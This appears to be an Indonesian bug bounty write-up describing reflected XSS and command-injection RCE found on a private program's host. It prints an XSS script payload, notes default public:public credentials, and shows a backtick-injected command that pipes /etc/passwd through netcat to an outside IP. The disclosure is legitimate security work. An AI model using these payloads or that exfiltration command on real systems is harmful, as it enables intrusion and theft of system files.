---
layout: post
title: "[Bug Bounty] RCE and XSS on Private Program Cyber Army ID"
date: 2019-02-14
tags: bugbounty
---

### <b>Prolog</b>
Lagi naik KRL dari Tangerang-Jakarta, sambil main HP tiba-tiba ada email undangan private program di [Cyber Army](https://www.cyberarmy.id/),langsung cuz klik terima. Malamnya gw lihat detail programnya, disana diberikan 2 alamat yang masuk dalam scope, yaitu  sub.[redacted].id dan subdomain.[redacted].id, ternyata 2 domain tersebut terdapat dalam 1 server dengan aplikasi yang serupa, jadi total ada 6 vuln yang saya temukan.
- 4 XSS
- 2 RCE

### <b>Reconnaissance</b>
Pada tahap reconnaissance,saya menggunakan nmap dengan perintah
`nmap sub.[redacted].id`

Disana terdapat beberapa port yang open, saya tertarik dengan port 8010. Pada saat tulisan ini dibuat saya coba scan lagi ternyata sudah filtered.

<div align="center">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/1.png?raw=true">
</div>


Saat saya buka sub.[redacted].id:8010, disana terdapat form login yang diketahui credentialnya menggunakan user dan password public:public. Disana terdapat beberapa menu (lupa screenshot). 

### <b>XSS via POST Request
Untuk metode XSS ini berdampak pada 2 fungsi/menu:
- Menu dblist
- Menu dnsbse

Saya tertarik dengan fungsi search yg ada di menu dnsbse, disana ada form search yang merequest google search engine. Saya coba searcing "test", ternyata inputan kita ditampilkan di browser,hmmmm... Langsung terpikir untuk input payload XSS, dengan mengirim payload XSS sejuta ummat `"><script>alert("p00w")</script>` ternyata payload dirender dengan baik.

### POC :
- Script : https://pastebin.com/raw/zZN1pfSY

<div align="center">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/2.png?raw=true">
</div>



### <b>Remote Code Execution</b>
Masih ingat menu dnsbse? Tadi yang kita bahas kalau fungsi dnsbse juga merequest search engine google dan menampilkan hasilnya disana. Saya tebak kalau fungsi dnsbse itu pake curl buat request ke server googlenya,asumsinya kira-kira seperti ini:
`shell_exec('curl {website with request}')`

Saya pikir ini bisa diexploitasi dengan SSRF (Server Side Request Forgery);

<div align="center">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/3.png?raw=true">
</div>

setelah mencoba beberapa payload SSRF, ternyata zonk wwkwkw `>_<` 
Saya sambil baca-baca referensi, akhirnya ketemu cara bypass stringnya hanya menggunakan backtick, sehingga kita dapat menjalankan perintah shell pada `shell_exec` tadi. 

Saya masukin request ke repeater di burp, lalu saya masukin payload `cat /etc/passwd | nc XXX.199.221.101 9091` pada parameter server, dan didapatkan result:
<div align="center">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/4.png?raw=true">
</div>

<div align="center">
    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/5.png?raw=true">
</div>



- 12 February Send Report
- 13 February Validation
- 14 February disclose
- Rewarded


### <b>Reference:</b>
- https://medium.com/@uranium238/getting-a-rce-ctf-way-2fd612fb643f

### <b>Thanks:</b>
- Ngesec
- Surabaya Hacker Link
- You!